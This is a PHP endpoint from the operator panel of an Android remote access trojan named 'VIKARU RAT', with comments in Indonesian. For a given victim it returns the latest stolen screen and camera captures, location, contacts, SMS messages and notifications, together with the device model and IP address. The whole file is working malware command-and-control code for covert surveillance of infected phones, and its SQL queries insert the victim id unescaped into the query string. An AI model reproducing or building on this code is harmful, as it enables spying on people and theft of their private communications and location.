<?php
/**
 * VIKARU RAT - Live Data Endpoint
 * Method: GET (Panel melihat data live dari korban)
 * Parameter: victim_id
 */

require_once __DIR__ . '/../config.php';

// Auth wajib
requireAuth();

if ($_SERVER['REQUEST_METHOD'] !== 'GET') {
    http_response_code(405);
    echo json_encode(['error' => 'method_not_allowed']);
    exit;
}

$victimId = sanitize($conn, $_GET['victim_id'] ?? '');

if (empty($victimId)) {
    http_response_code(400);
    echo json_encode(['error' => 'missing_victim_id']);
    exit;
}

// Fungsi ambil data terbaru berdasarkan tipe
function getLatestLog($conn, $victimId, $type) {
    $sql = "SELECT data FROM logs 
            WHERE victim_id='$victimId' AND type='$type' 
            ORDER BY captured_at DESC 
            LIMIT 1";
    $result = mysqli_query($conn, $sql);
    if ($result && mysqli_num_rows($result) > 0) {
        $row = mysqli_fetch_assoc($result);
        return $row['data'];
    }
    return null;
}

// Ambil semua data live
$screen    = getLatestLog($conn, $victimId, 'screen_capture');
$camera    = getLatestLog($conn, $victimId, 'camera_capture');
$location  = getLatestLog($conn, $victimId, 'location');
$contacts  = getLatestLog($conn, $victimId, 'contacts');
$sms       = getLatestLog($conn, $victimId, 'sms');
$notif     = getLatestLog($conn, $victimId, 'notifications');

// Ambil info victim
$infoQuery = mysqli_query($conn, "SELECT * FROM victims WHERE id='$victimId'");
$info = mysqli_fetch_assoc($infoQuery);

// Response
echo json_encode([
    'victim' => [
        'id'              => $info['id'] ?? $victimId,
        'model'           => $info['model'] ?? 'Unknown',
        'android_version' => $info['android_version'] ?? 'Unknown',
        'ip_address'      => $info['ip_address'] ?? 'Unknown',
        'status'          => $info['status'] ?? 'offline',
        'last_online'     => $info['last_online'] ?? null
    ],
    'data' => [
        'screen_capture'  => $screen,
        'camera_capture'  => $camera,
        'location'        => $location,
        'contacts'        => $contacts,
        'sms'             => $sms,
        'notifications'   => $notif
    ]
]);
?>
